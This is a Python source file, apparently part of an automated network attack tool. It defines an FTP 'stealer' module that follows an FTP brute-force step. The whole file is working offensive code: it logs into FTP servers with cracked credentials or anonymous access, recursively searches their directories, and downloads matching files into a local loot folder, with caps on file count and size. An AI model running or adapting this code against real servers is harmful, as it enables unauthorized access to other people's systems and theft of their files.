"""
steal_files_ftp.py - Connects to FTP servers with cracked credentials (or anonymous),
finds files matching the steal_file_* config, and downloads them.

#12: the scaffolding (parent gate, latch reset, credential load, watchdog timer, credential
loop, outcome contract, #6 budgets) lives in base_stealer.BaseStealer. This file is the FTP
adapter. Anonymous access is tried first by prepending ("anonymous", "") to the credential list.
"""

import logging
import os
from ftplib import FTP

from base_stealer import (
    BaseStealer, MAX_DEPTH, MAX_FILES_PER_RUN, MAX_FILE_BYTES, MAX_RUN_BYTES, MIN_FREE_BYTES,
)
from logger import Logger
from shared import SharedData

# Configure the logger
logger = Logger(name="steal_files_ftp.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesFTP"
b_module = "steal_files_ftp"
b_status = "steal_files_ftp"
b_parent = "FTPBruteforce"
b_port = 21


class StealFilesFTP(BaseStealer):
    """Steal files from FTP servers (including anonymous access)."""

    CRED_FILE_ATTR = "ftpfile"
    LOOT_SUBDIR = "ftp"
    CONNECTED_FLAG = "ftp_connected"
    LOGGER = logger
    ROOT = "/"

    def load_credentials(self, ip):
        """Cracked pairs plus anonymous first so open shares are tried without a prior crack."""
        credentials = super().load_credentials(ip)
        # Prepend anonymous; the base loop will try it first and move on if it fails.
        if ("anonymous", "") not in credentials:
            credentials = [("anonymous", "")] + list(credentials)
        return credentials

    def open_session(self, ip, username, password):
        ftp = FTP()
        ftp.connect(ip, 21, timeout=10)
        ftp.login(user=username, passwd=password)
        self.mark_connected()
        logger.info(f"Connected to {ip} via FTP with username {username}")
        return ftp

    def close_session(self, conn):
        try:
            conn.quit()
        except Exception:
            try:
                conn.close()
            except Exception:
                pass

    def find_files(self, ftp, dir_path, depth=0, visited=None):
        """Recursive walk with depth/visited/file caps (same guards the pre-base version had)."""
        if visited is None:
            visited = set()
        files = []
        if depth > MAX_DEPTH:
            return files
        key = dir_path.rstrip('/') or '/'
        if key in visited:
            logger.warning(f"FTP cycle detected at {dir_path}; stopping recurse")
            return files
        visited.add(key)
        try:
            ftp.cwd(dir_path)
            items = ftp.nlst()
            for item in items:
                if self.shared_data.orchestrator_should_exit or getattr(self, 'stop_execution', False):
                    break
                if len(files) >= MAX_FILES_PER_RUN:
                    logger.warning(f"FTP file cap ({MAX_FILES_PER_RUN}) reached under {dir_path}")
                    break
                base = os.path.basename(item.rstrip('/'))
                if base in ('.', '..'):
                    continue
                try:
                    ftp.cwd(item)
                    ftp.cwd('..')  # it was a directory — recurse
                    files.extend(self.find_files(
                        ftp, os.path.join(dir_path, base),
                        depth=depth + 1, visited=visited,
                    ))
                    ftp.cwd(dir_path)  # restore after recurse
                except Exception:
                    if self.matches_wanted(item):
                        files.append(os.path.join(dir_path, item) if not item.startswith('/') else item)
            logger.info(f"Found {len(files)} matching files in {dir_path} on FTP")
        except Exception as e:
            logger.error(f"Error accessing path {dir_path} on FTP: {e}")
        return files

    def steal_file(self, ftp, remote_file, local_dir):
        """Download via retrbinary with mid-stream byte caps."""
        if not self.check_budget(local_dir):
            return
        local_file_path = None
        try:
            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)

            written = [0]

            def _cb(chunk):
                written[0] += len(chunk)
                if written[0] > MAX_FILE_BYTES:
                    raise IOError(f"file exceeds MAX_FILE_BYTES ({MAX_FILE_BYTES})")
                if getattr(self, '_run_bytes', 0) + written[0] > MAX_RUN_BYTES:
                    raise IOError(f"run would exceed MAX_RUN_BYTES ({MAX_RUN_BYTES})")
                f.write(chunk)

            with open(local_file_path, 'wb') as f:
                ftp.retrbinary(f'RETR {remote_file}', _cb)
            self.note_bytes(written[0])
            logger.success(
                f"Downloaded file from {remote_file} to {local_file_path} ({written[0]} bytes)")
        except Exception as e:
            logger.error(f"Error downloading file {remote_file} from FTP: {e}")
            try:
                if local_file_path and os.path.exists(local_file_path):
                    os.unlink(local_file_path)
            except OSError:
                pass


if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_ftp = StealFilesFTP(shared_data)
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
